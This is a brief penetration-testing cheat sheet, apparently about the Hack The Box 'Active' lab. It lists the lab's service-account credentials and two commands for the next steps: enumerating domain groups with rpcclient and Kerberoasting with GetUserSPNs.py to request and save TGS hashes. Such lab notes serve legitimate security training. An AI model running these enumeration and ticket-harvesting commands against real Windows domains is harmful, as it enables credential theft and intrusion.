# After getting windows credentials

* Say
  * username : SVC\_TGS
  * password : GPPstillStandingStrong2k18
  * victim IP : 10.10.10.100
  * domain : active.htb
* Enumerate users
  * rpcclient -U "SVC\_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
  * GetUserSPNs.py active.htb/SVC\_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -output tgs.hash

